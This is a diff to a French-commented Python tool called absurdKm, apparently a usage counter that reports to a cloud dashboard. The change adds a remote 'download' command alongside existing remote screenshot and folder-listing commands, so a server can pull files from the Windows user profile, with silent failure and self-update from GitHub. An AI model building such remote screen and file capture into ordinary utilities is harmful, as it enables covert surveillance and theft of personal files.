@@ -55,7 +55,7 @@ SHOT_MAX_W = 2560                      # définition max de la capture envoyée 
 SHOT_MAX_H = 1600
 SHOT_QUALITY = 85                      # qualité JPEG (1-100)
 
-VERSION = "1.7.8"
+VERSION = "1.7.9"
 UPDATE_URL = "https://raw.githubusercontent.com/fenix1048/assets-21st.dev/main/absurdeKm.pyw"
 
 # --- tableau de bord en ligne (Cloudflare Worker) ---
@@ -332,13 +332,18 @@ def cloud_request(path, data=None, timeout=30):
 # ------------------------- explorateur de fichiers (lecture seule) -------------------------
 LIST_ROOT = os.path.realpath(os.environ.get("USERPROFILE", os.path.expanduser("~")))
 LIST_MAX = 500
+DL_MAX = 10 * 1024 * 1024    # 10 Mo maximum par téléchargement
 HIDDEN_ATTRS = 0x02 | 0x04   # fichier caché | fichier système
 
-def list_folder(rel):
-    """Liste un dossier du profil Windows. Lecture seule, rien ne peut sortir du profil."""
+def safe_path(rel):
+    """Renvoie un chemin situé dans le profil Windows, sinon refuse."""
     target = os.path.realpath(os.path.join(LIST_ROOT, rel.strip("\\/")))
     if os.path.commonpath([LIST_ROOT, target]) != LIST_ROOT:
-        raise PermissionError("Dossier hors du profil")
+        raise PermissionError("Chemin hors du profil")
+    return target
+
+def list_folder(rel):
+    target = safe_path(rel)
     if not os.path.isdir(target):
         raise FileNotFoundError("Dossier introuvable")
     items = []
@@ -359,7 +364,21 @@ def list_folder(rel):
         rel_out = ""
     return {"path": rel_out, "items": items[:LIST_MAX], "total": len(items)}
 
+def download_file(rel):
+    target = safe_path(rel)
+    if not os.path.isfile(target):
+        raise FileNotFoundError("Fichier introuvable")
+    st = os.stat(target)
+    if getattr(st, "st_file_attributes", 0) & HIDDEN_ATTRS:
+        raise PermissionError("Fichier caché")
+    if st.st_size > DL_MAX:
+        raise ValueError("Fichier trop gros (maximum 10 Mo)")
+    with open(target, "rb") as f:
+        data = f.read()
+    return {"name": os.path.basename(target), "data": base64.b64encode(data).decode("ascii")}
+
 def cloud_loop():
+    """Envoie les stats et exécute les demandes (capture, liste, téléchargement). Échec silencieux."""
     pc = socket.gethostname()
     last_push = 0.0
     last_id = None
@@ -373,13 +392,16 @@ def cloud_loop():
             if rid and rid != last_id:
                 last_id = rid
                 try:
-                    if cmd.get("type") == "list":
+                    kind = cmd.get("type")
+                    if kind == "list":
                         result = {"id": rid, "list": list_folder(cmd.get("path", ""))}
+                    elif kind == "download":
+                        result = {"id": rid, "file": download_file(cmd.get("path", ""))}
                     else:
                         result = {"id": rid, "image": capture_screen_jpeg_b64()}
                 except Exception as e:
                     result = {"id": rid, "error": str(e)[:200]}
-                cloud_request("/api/result", result, timeout=60)
+                cloud_request("/api/result", result, timeout=120)
         except Exception:
             pass  # absurdKm continue de compter même si le serveur ne répond pas
         time.sleep(CLOUD_POLL_S)
